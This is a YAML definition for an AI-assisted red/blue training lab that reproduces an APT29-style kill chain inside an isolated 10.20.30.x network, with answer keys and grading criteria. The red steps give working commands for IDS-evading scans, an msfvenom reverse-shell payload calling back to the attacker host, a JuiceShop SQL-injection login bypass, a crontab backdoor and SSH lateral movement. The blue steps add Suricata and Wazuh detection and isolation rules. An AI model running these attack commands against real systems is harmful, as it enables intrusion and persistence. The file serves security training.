lab_id: battle-adv-ai-week10
title: APT 캠페인 시뮬레이션 — 다단계 지능형 공격 재현 (AI 지원)
version: ai
course: battle-adv-ai
week: 10
description: 실제 APT 캠페인(APT29 스타일)을 완전히 재현한다. 정찰부터 데이터 유출까지 전체 킬체인을 단일 인프라에서 실행하고,
  동시에 Blue Phase에서 각 단계를 탐지/차단/분석한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 150
objectives:
- APT29 스타일 공격 캠페인을 단계별로 재현한다
- 킬체인 각 단계에서 Red/Blue 관점을 전환한다
- 공격 타임라인과 탐지 커버리지를 비교 분석한다
prerequisites:
- battle-adv-nonai week09 이수
infra_requirements:
- attacker (10.20.30.201) — nmap, metasploit, sqlmap, hydra, nikto
- secu (10.20.30.1) — nftables, suricata
- web (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] APT 캠페인 Phase 1 — 스텔스 정찰. SYN 스캔으로 10.20.30.0/24를 스캔하되, 탐지를
    피하기 위해 느린 타이밍(-T2)을 사용하라. NSE 스크립트로 웹 서비스를 추가 분석하라.'
  hint: -sS -T2로 느린 스캔을 하고, http-enum 스크립트로 웹 경로를 탐색한다.
  category: recon
  points: 10
  answer: '🤖 프롬프트: [RED] APT 캠페인 Phase 1 — 스텔스 정찰. SYN 스캔으로 10.20.30.0/24를 스캔하되, 탐지를
    피하기 위해 느린 타이밍(-T2)을 사용하라. NSE 스크립트로 웹 서비스를 추가 분석해줘

    📎 참고 (CLI): sudo nmap -sS -sV -T2 --top-ports 20 --max-retries 1 --host-timeout
    15s 10.20.30.80 -oX /tmp/apt_campaign_recon.xml 2>&1 | tail -15 && nmap --script
    http-enum -p 80,3000,8080 --max-retries 1 --host-timeout 15s -T4 10.20.30.80 2>&1
    | tail -15'
  answer_detail: APT29 스타일 정찰은 느린 타이밍(-T2)으로 IDS 탐지를 회피한다. 주요 포트만 대상으로 하여 노이즈를 최소화하고,
    NSE 스크립트로 웹 경로를 열거한다.
  verify:
    type: output_contains
    expect: open
    semantic:
      intent: '[RED] APT Phase 1 스텔스 정찰 — nmap -sS -T2 --max-scan-delay 1s -f --data-length
        30 -p 22,80,443,3000 10.20.30.0/24. -T2 polite + --max-scan-delay 로 분당 ~30
        패킷 이하 + -f 프래그멘트 + --data-length 30 시그니처 변조. w6 s2 의 커스텀 룰(threshold 20/5s)
        임계 이하 유지 → 탐지 회피'
      success_criteria:
      - -T2 또는 --max-scan-delay
      - -f 프래그멘트 또는 --data-length
      - threshold 이하 페이스 유지
      acceptable_methods:
      - nmap -T2 -f --data-length
      - masscan --rate 1
      - 수동 nc 단발
      - shodan 으로 passive
      negative_signs:
      - -T4/-T5 (탐지됨)
      - 단일 옵션만
      - 스텔스 개념 없음
  target_vm: attacker
  script: sudo nmap -sS -sV -T2 --top-ports 20 --max-retries 1 --host-timeout 15s
    10.20.30.80 -oX /tmp/apt_campaign_recon.xml 2>&1 | tail -15 && nmap --script http-enum
    -p 80,3000,8080 --max-retries 1 --host-timeout 15s -T4 10.20.30.80 2>&1 | tail
    -15
  risk_level: low
  bastion_prompt: '[RED] APT 캠페인 Phase 1 — 스텔스 정찰. SYN 스캔으로 10.20.30.0/24를 스캔하되, 탐지를
    피하기 위해 느린 타이밍(-T2)을 사용하라. NSE 스크립트로 웹 서비스를 추가 분석해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: '[RED] APT Phase 2 — Initial Access. msfvenom으로 Linux 리버스 쉘 페이로드를 생성(저장만)한
    후, JuiceShop에 SQL Injection으로 관리자 접근을 획득하라.'
  hint: msfvenom으로 ELF 페이로드를 생성하고, SQLi로 admin 토큰을 획득한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] APT Phase 2 — Initial Access. msfvenom으로 Linux 리버스 쉘 페이로드를
    생성(저장만)한 후, JuiceShop에 SQL Injection으로 관리자 접근을 획득해줘

    📎 참고 (CLI): msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444
    -f elf -o /tmp/apt_campaign_payload.elf 2>&1 | tail -3 && echo ''--- SQLi Initial
    Access ---'' && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"\" OR 1=1--","password":"x"}'' | python3 -m
    json.tool | head -10'
  answer_detail: Weaponization(msfvenom 페이로드)과 Exploitation(SQLi)을 연계한다. 페이로드는 저장만
    하고 실행하지 않는다. SQLi로 admin JWT 토큰을 획득한다.
  verify:
    type: output_contains
    expect: token
    semantic:
      intent: '[RED] APT Phase 2 Initial Access — msfvenom -p linux/x64/shell_reverse_tcp
        LHOST LPORT -f elf -o /tmp/apt_payload.elf (저장만, 실행 없음) + curl POST /rest/user/login
        SQLi 로 JWT 획득 → /api/Users 접근. 페이로드 weaponize + SQLi 로 초기 접근 교두보. MITRE TA0001
        Initial Access'
      success_criteria:
      - msfvenom payload 생성 (실행 없음)
      - JuiceShop SQLi + JWT 획득
      - Initial Access 개념
      acceptable_methods:
      - msfvenom -f elf + SQLi
      - sqlmap 자동화
      - Burp Intruder
      negative_signs:
      - payload 실제 실행
      - SQLi 없이 페이로드만
      - TA0001 매핑 없음
  target_vm: attacker
  script: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f
    elf -o /tmp/apt_campaign_payload.elf 2>&1 | tail -3 && echo ''--- SQLi Initial
    Access ---'' && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"\" OR 1=1--","password":"x"}'' | python3 -m
    json.tool | head -10'
  risk_level: medium
  bastion_prompt: '[RED] APT Phase 2 — Initial Access. msfvenom으로 Linux 리버스 쉘 페이로드를
    생성(저장만)한 후, JuiceShop에 SQL Injection으로 관리자 접근을 획득해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: '[RED] APT Phase 3 — Persistence + Lateral Movement. crontab 백도어를 설치하고,
    SSH로 내부 서버({{SECU_IP}}, {{SECU_IP}}00)에 접근을 시도하라.'
  hint: crontab에 비컨 엔트리를 추가하고, SSH로 측면 이동을 시도한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] APT Phase 3 — Persistence + Lateral Movement. crontab 백도어를
    설치하고, SSH로 내부 서버(10.20.30.1, 10.20.30.100)에 접근을 시도해줘

    📎 참고 (CLI): echo "*/10 * * * * echo APT_CAMPAIGN_BEACON > /tmp/apt_beacon.txt"
    | crontab - && crontab -l && echo "--- Lateral Movement ---" && ssh -o ConnectTimeout=3
    -o StrictHostKeyChecking=no ccc@10.20.30.1 "hostname && id" 2>&1 | head -3 &&
    ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.100 "hostname
    && id" 2>&1 | head -3'
  answer_detail: Persistence(crontab T1053.003)와 Lateral Movement(SSH T1021.004)를
    연계한다. 실제 APT는 여러 서버에 동시에 Persistence를 설치한다.
  verify:
    type: output_contains
    expect: APT_CAMPAIGN
    semantic:
      intent: '[RED] APT Phase 3 Persistence + Lateral Movement — (crontab -l; echo
        */5 * * * * echo APT-test >> /tmp/.apt_bd) | crontab - (5분 주기 백도어 시뮬레이션) +
        ssh ccc@secu hostname && id (내부 서버 측면 이동) + ssh ccc@web uname -a (다른 서버).
        지속성 + 측면 이동 combo. TA0003 Persistence + TA0008 Lateral Movement'
      success_criteria:
      - crontab 백도어 설치
      - 내부 서버(secu/web) SSH 이동
      - Persistence + Lateral 복합
      acceptable_methods:
      - crontab + ssh 중첩 접속
      - systemd service 대체
      - SSH ProxyJump
      negative_signs:
      - Persistence 또는 Lateral 하나만
      - 실제 파괴적 명령
      - TA0003/TA0008 매핑 없음
  target_vm: attacker
  script: echo "*/10 * * * * echo APT_CAMPAIGN_BEACON > /tmp/apt_beacon.txt" | crontab
    - && crontab -l && echo "--- Lateral Movement ---" && ssh -o ConnectTimeout=3
    -o StrictHostKeyChecking=no ccc@10.20.30.1 "hostname && id" 2>&1 | head -3 &&
    ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.100 "hostname
    && id" 2>&1 | head -3
  risk_level: medium
  bastion_prompt: '[RED] APT Phase 3 — Persistence + Lateral Movement. crontab 백도어를
    설치하고, SSH로 내부 서버(10.20.30.1, 10.20.30.100)에 접근을 시도해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: '[BLUE] Phase 전환 — 진행 중인 APT 캠페인을 탐지하라. Suricata 알림, auth.log, crontab
    변경을 교차 분석하라.'
  hint: 각 로그 소스에서 최근 이벤트를 필터링하고 상관 분석한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] Phase 전환 — 진행 중인 APT 캠페인을 탐지하라. Suricata 알림, auth.log, crontab
    변경을 교차 분석해줘

    📎 참고 (CLI): echo "=== APT Campaign Detection ===" && echo "[1] Suricata alerts:"
    && ssh 10.20.30.1 "tail -30 /var/log/suricata/eve.json 2>/dev/null | python3 -c
    \"import sys,json; [print(json.loads(l).get(''alert'',{}).get(''signature'',''))
    for l in sys.stdin if ''alert'' in l]\" 2>/dev/null" 2>&1 | tail -5 && echo "[2]
    SSH lateral movement:" && grep "Accepted" /var/log/auth.log 2>/dev/null | tail
    -5 && echo "[3] Crontab persistence:" && crontab -l 2>/dev/null | grep -v "^#"
    && echo "[4] Detection summary:" && echo "  Scan: DETECTED (Suricata)" && echo
    "  SQLi: DETECTED (WAF/Suricata)" && echo "  Persistence: PARTIAL (crontab logged,
    no FIM alert)" && echo "  Lateral: PARTIAL (SSH logged, no correlation rule)"'
  answer_detail: APT 캠페인 탐지에서 Suricata(스캔/SQLi), auth.log(SSH 이동), crontab(Persistence)을
    교차 분석한다. 개별 이벤트는 기록되지만 상관 분석 부재가 Gap이다.
  verify:
    type: output_contains
    expect: APT Campaign Detection
    semantic:
      intent: '[BLUE] 진행 중 APT 캠페인 탐지 — tail /var/log/suricata/fast.log + tail /var/log/auth.log
        (SSH 이동) + crontab -l + diff <(현재 crontab) <(/tmp/crontab_baseline) 교차 분석.
        APT 는 단일 소스로 놓치기 쉬움 → 네트워크(Suricata) + 인증(auth) + 지속성(crontab) 3 소스 상관'
      success_criteria:
      - 3개 소스 교차 분석 (Suricata + auth + crontab)
      - crontab 변경 diff
      - APT 맥락 종합 분석
      acceptable_methods:
      - tail + diff + jq
      - Wazuh 통합 뷰
      - Sigma rule 다중 소스
      negative_signs:
      - 1-2개 소스만
      - diff 없이 현재 상태만
      - APT 맥락 없음
  target_vm: secu
  script: 'echo "=== APT Campaign Detection ===" && echo "[1] Suricata alerts:" &&
    ssh 10.20.30.1 "tail -30 /var/log/suricata/eve.json 2>/dev/null | python3 -c \"import
    sys,json; [print(json.loads(l).get(''alert'',{}).get(''signature'','')) for l
    in sys.stdin if ''alert'' in l]\" 2>/dev/null" 2>&1 | tail -5 && echo "[2] SSH
    lateral movement:" && grep "Accepted" /var/log/auth.log 2>/dev/null | tail -5
    && echo "[3] Crontab persistence:" && crontab -l 2>/dev/null | grep -v "^#" &&
    echo "[4] Detection summary:" && echo "  Scan: DETECTED (Suricata)" && echo "  SQLi:
    DETECTED (WAF/Suricata)" && echo "  Persistence: PARTIAL (crontab logged, no FIM
    alert)" && echo "  Lateral: PARTIAL (SSH logged, no correlation rule)"'
  risk_level: low
  bastion_prompt: '[BLUE] Phase 전환 — 진행 중인 APT 캠페인을 탐지하라. Suricata 알림, auth.log, crontab
    변경을 교차 분석해줘'
- order: 5
  instruction: '[BLUE] APT 캠페인의 탐지 Gap을 해소하는 Wazuh 상관 분석 규칙과 Suricata 커스텀 시그니처를 작성하라.'
  hint: 다단계 공격 패턴(스캔 + SQLi + SSH + crontab)을 상관 분석한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] APT 캠페인의 탐지 Gap을 해소하는 Wazuh 상관 분석 규칙과 Suricata 커스텀 시그니처를
    구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): cat > /tmp/apt_campaign_rules.txt << ''EOF'' # Wazuh: APT campaign
    correlation <group name="apt_campaign"> <rule id="100400" level="15" frequency="4"
    timeframe="600"> <if_matched_group>apt_campaign_indicator</if_matched_group> <description>APT
    CAMPAIGN: 4+ kill chain stages detected in 10 min</description> <mitre><id>T1595</id><id>T1190</id><id>T1053</id><id>T1021</id></mitre>
    </rule> </group>

    # Suricata: Slow scan detection alert tcp any any -> 10.20.30.0/24 any (msg:"APT:
    Slow scan detected"; flags:S; threshold:type both, track by_src, count 5, seconds
    300; sid:5000010; rev:1;) EOF cat /tmp/apt_campaign_rules.txt'
  answer_detail: APT 캠페인 탐지 규칙은 10분 내 4개 이상 킬체인 단계가 감지되면 최고 레벨 알림을 발생시킨다. 느린 스캔도 5분
    윈도우로 탐지한다.
  verify:
    type: output_contains
    expect: APT CAMPAIGN
    semantic:
      intent: '[BLUE] 탐지 Gap 해소 룰 추가 — Wazuh correlation: APT 캠페인 signature (여러 Technique
        매칭 시) + Suricata 커스텀: APT stealth 스캔 탐지 (threshold 낮춤 5/30s · -f 프래그멘트 탐지
        reassembly). s1 의 스텔스 스캔이 s4 에서 놓쳐진 원인 해소. 반복적 tuning process'
      success_criteria:
      - Wazuh correlation + Suricata 커스텀 룰
      - s1 스텔스 스캔 검출 가능
      - 반복 tuning 개념
      acceptable_methods:
      - local_rules.xml 편집 + /etc/suricata/rules/local.rules
      - Sigma → Elastic 변환
      - Zeek notice.log 조정
      negative_signs:
      - 기존 룰 재사용만
      - Gap 분석 없음
      - tuning 반복 없음
  target_vm: siem
  script: 'cat > /tmp/apt_campaign_rules.txt << ''EOF'' # Wazuh: APT campaign correlation
    <group name="apt_campaign"> <rule id="100400" level="15" frequency="4" timeframe="600">
    <if_matched_group>apt_campaign_indicator</if_matched_group> <description>APT CAMPAIGN:
    4+ kill chain stages detected in 10 min</description> <mitre><id>T1595</id><id>T1190</id><id>T1053</id><id>T1021</id></mitre>
    </rule> </group>

    # Suricata: Slow scan detection alert tcp any any -> 10.20.30.0/24 any (msg:"APT:
    Slow scan detected"; flags:S; threshold:type both, track by_src, count 5, seconds
    300; sid:5000010; rev:1;) EOF cat /tmp/apt_campaign_rules.txt'
  risk_level: low
  bastion_prompt: '[BLUE] APT 캠페인의 탐지 Gap을 해소하는 Wazuh 상관 분석 규칙과 Suricata 커스텀 시그니처를
    작성하라.'
- order: 6
  instruction: '[BLUE] Wazuh Active Response를 활용하여 APT 캠페인 감지 시 자동 격리를 수행하는 설정을 작성하라.'
  hint: rule_id 100400 트리거 시 firewall-drop과 host-deny를 동시 실행한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] Wazuh Active Response를 활용하여 APT 캠페인 감지 시 자동 격리를 수행하는 설정을
    구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): cat > /tmp/apt_active_response.xml << ''EOF'' <ossec_config> <active-response>
    <command>firewall-drop</command> <location>all</location> <rules_id>100400</rules_id>
    <timeout>7200</timeout> </active-response> <active-response> <command>host-deny</command>
    <location>all</location> <rules_id>100400</rules_id> <timeout>7200</timeout> </active-response>
    </ossec_config> EOF cat /tmp/apt_active_response.xml'
  answer_detail: APT 캠페인 감지(rule 100400) 시 모든 에이전트에서 동시에 firewall-drop과 host-deny를
    실행하여 공격자 IP를 2시간 동안 전체 인프라에서 격리한다.
  verify:
    type: output_contains
    expect: active-response
    semantic:
      intent: '[BLUE] APT 감지 시 Wazuh Active Response 자동 격리 — ossec.conf <active-response><command>firewall-drop</command>
        + custom command (kill process·disable user·isolate host). APT 특화 rule (level
        12+ composite) 매칭 시 연쇄 자동 대응. 복합 격리 (단순 IP 차단 이상)'
      success_criteria:
      - ossec.conf APT 전용 Active Response
      - firewall-drop + custom 명령
      - 복합 격리 개념
      acceptable_methods:
      - ossec.conf + custom script
      - Wazuh active-response/bin/ 스크립트
      - Shuffle workflow
